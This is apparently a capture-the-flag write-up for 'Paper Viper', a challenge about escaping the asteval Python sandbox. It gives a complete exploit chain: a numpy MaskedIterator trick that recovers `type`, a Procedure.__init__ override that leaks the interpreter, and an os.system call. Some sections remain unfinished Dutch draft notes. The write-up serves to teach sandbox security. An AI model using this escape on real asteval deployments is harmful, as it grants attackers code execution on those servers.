# Paper Viper

<img src="chal_descr.png" alt="Challenge description" width="400">

**Author**: Ward  
**Flag**: `kalmar{d0nt_play_w1th_5n4kes_if_you_don7_h4ve_gl0v3s}`  

## Setup
Handout: `chal.py`, `Dockerfile`, `compose.yml`, `getflag.c` and a fake `flag.txt`.

`chal.py` is the main challenge file. The goal of the challenge is to get code execution on the server and run the getflag binary.
In the Dockerfile we find that `numpy` is installed, and `asteval` with version `1.0.6` (which is the latest release).

## The challenge:
The challenge description is a reference to UofTCTF (shout out to SteakEnthusiast), in which there were three challenges on `asteval`, a "safe sandboxing" library for python.
After that CTF a few of the vulnerabilities in the library were fixed, but as anyone familiar with pyjails will know, sandboxing python is very difficult to achieve with the amount of introspection the language has, and things like unpatched memory bugs in cpython. In the case of `asteval`, `numpy` is included by default, which dramatically worsens these issues.

After that CTF I went and did some more research into `asteval` and found a few 0days, some of which I turned into this challenge.

The source code of `chal.py`:
```python
import asteval

# With this many functions from numpy removed there definitely will not be a way for users to get to `type()`, which is a security risk
asteval.astutils.NUMPY_TABLE = {k: asteval.astutils.NUMPY_TABLE[k] for k in ["genfromtxt"]}

def get_input():
    print("Give input, end with a line of $END$")
    inp = ""
    while True:
        temp = input()
        if temp == "$END$":
            break
        inp += temp +"\n"
    return inp

def nope(text):
    if not text.isascii():
        quit("Sorry, only ascii!")
    if any([text.find(x) >= 0 for x in ["yt", "ty", "rm", "uf", "**"]]):
        quit('Sorry, those bigrams just give me bad vibes!')

def main():
    inp = get_input()
    nope(inp)
    asteval.Interpreter().eval(inp, raise_errors=True)

if __name__ == "__main__":
    main()
```

As we can see, the user gives multiline input which is passed through a filter and then evaluated by the `asteval` Interpreter.
With its default settings, `asteval` includes a large set of `numpy` names in the symbol table available from within the sandbox. In this challenge the player is only given a single one of these, the function `genfromtxt()`, with a comment hinting at the function `type()`.

By default, the name `type` available within the sandbox is a "safe version" of it which returns the name of the type as a string.

The filters included are written to prevent some of the easier unintended solutions. There are a lot unpatched vulnerabilities in `asteval`, some of which are quite trivial, which these filters are intended to prevent. It was quite challenging to push players in the right direction while restricting unintendeds in a way that doesn't feel too arbitrary, which I feel I didn't really succeed at.

Specifically these filters are to block:
`byte` and `bytearray`, `dtype`, `type` (the numpy attribute), `ctypes`, `format`, `buffer` and dict unwrapping as a way to pass keyword arguments to functions in a way to bypass text filters (since the dictionary keys are string literals that can be constructed past the filter).

## The solution:
During the CTF there were two solves, by two familiar faces when it comes to pyjails, Lyndon from MMM and oh_word from Infobahn.

Lyndon's solve is based on f-strings and the well-known method of using `AttributeError.obj` to extract a value from a format string, which was a variant of a solve for the UofTCTF chals. It's a technique that I'm aware of. `asteval` had a patch after UofTCTF which intended to fix this but didn't work. Because of a version difference this didn't work during my testing, so I didn't filter it.

oh_word's solve went the intended route to obtain `type` and then did memory exploitation, presumably via the bytes class object.

### Getting a type primitive:
The challenge source contains a strong hint to try to obtain a `type` primitive via the one exposed `numpy` function `genfromtxt`. Having `type` would allow us to obtain references to class objects of builtin types but also of `asteval`-internal types for which we have access to their instances.

The easiest way to find this is to do some smart searches in the `numpy` library. E.g. if we search for `type(self.` we get 4 results, of which only 2 aren't in test files. More broad searches will also find it, though we would have more work in eliminating occurrences where either the arguments aren't user-controlled, or the results won't be reachable from the calling context.

From the two results we get there is one in `MaskedArray.count`:
```python
...
if isinstance(self.data, np.matrix):
    if m is nomask:
        m = np.zeros(self.shape, dtype=np.bool)
    m = m.view(type(self.data))
...
```
This isn't directly vulnerable: even if the isinstance-check wouldn't be a problem, the result of this call doesn't end up being used in such a way that we can easily get at the result.

The other option is in `MaskedIterator.__getitem__`
```python
def __getitem__(self, indx):
    result = self.dataiter.__getitem__(indx).view(type(self.ma))
    if self.maskiter is not None:
        _mask = self.maskiter.__getitem__(indx)
        if isinstance(_mask, ndarray):
            # set shape to match that of data; this is needed for matrices
            _mask.shape = result.shape
            result._mask = _mask
        elif isinstance(_mask, np.void):
            return mvoid(result, mask=_mask, hardmask=self.ma._hardmask)
        elif _mask:  # Just a scalar, masked
            return masked
    return result
```
Note that `self.dataiter` and `self.ma` are user-controlled. Thus, if we can make it so that the `.view` method of the object returned by the `__getitem__` call on `self.dataiter` either returns its argument, or e.g. adds its argument to some global list, this allows us to access the result of `type`. This would give us a useable `type` primitive.

At this point we need to figure out how to get a `MaskedIterator` instance from `genfromtxt`.

```python
# Get `type` primitive
def id(x):
    return x

genfromtxt.view = id
ma = genfromtxt(["1"], usemask=True)
mf = ma.flat
mf.maskiter = None
mf.ma = "foo"
mf.dataiter = [genfromtxt]
str = mf[0]

mf.ma = str
t = mf[0]
```

Wat geeft type ons? In de sandbox heb je een fake versie van type. Type stelt ons in staat om class objects te verkrijgen van alle objecten waar we toegang toe hebben in de sandbox, inclusief `asteval`-eigen klassen.

### Overriding class level dunders to leak the interpreter object:

Point out de bug in setattr van dunders.
Point out de bug van setattr in Procedure als instance-level-functie ipv class-level.

```python
# Get Procedure class object
def f():
    pass
p = t(f)

# Obtain the Interpreter instance
def stealer(name, interp, doc=None, lineno=None,
                 body=None, text=None, args=None, kwargs=None,
                 vararg=None, varkws=None):
    print(interp)
    kwargs[0][1].append(interp)
p.__init__ = stealer
rescuelist = []
def g(rescue=rescuelist):
    pass
i = rescuelist[0]
print(i)
```

Dit geeft ons een interpreter-object.

### Profit:
Op dit punt zijn er een heleboel opties.
De makkelijkste is om gewoon gebruik te maken van de importfunctionaliteit.
Een leuke alternatieve optie is om de attribuutnaam-check in on_name te omzeilen door een fake-subtype van string te maken en daarmee de waarde van een ast.Name node te overschrijven, maar die laat is als exercise to the reader.

```python
# Import and escape the jail
i.import_module("os",["sys"],["system"])
sys("echo hi mom")
sys("/getflag")
print()
```

`kalmar{d0nt_play_w1th_5n4kes_if_you_don7_h4ve_gl0v3s}`
